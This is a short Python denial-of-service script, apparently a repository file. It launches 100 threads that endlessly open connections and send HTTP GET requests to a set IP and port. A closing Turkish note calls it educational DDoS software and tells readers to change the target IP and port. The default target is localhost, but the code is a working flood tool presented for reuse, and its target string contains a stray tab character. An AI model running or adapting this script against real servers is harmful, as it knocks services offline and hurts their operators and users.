import socket
import threading

# Target information
target_ip = '127.0.0.1	'  # Localhost for safe testing
target_port = 80
# Function to simulate sending traffic
def dos_attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            sock.sendto(b"Host: localhost\r\n\r\n", (target_ip, target_port))
            sock.close()
        except:
            pass
# Launch multiple threads to simulate the attack
for i in range(100):
    thread = threading.Thread(target=dos_attack)
    thread.start()# ddos
ddos saldırırsı eğitim amaçlı yazılım.
target ip yerini ve portu degiştirebilirsiniz.
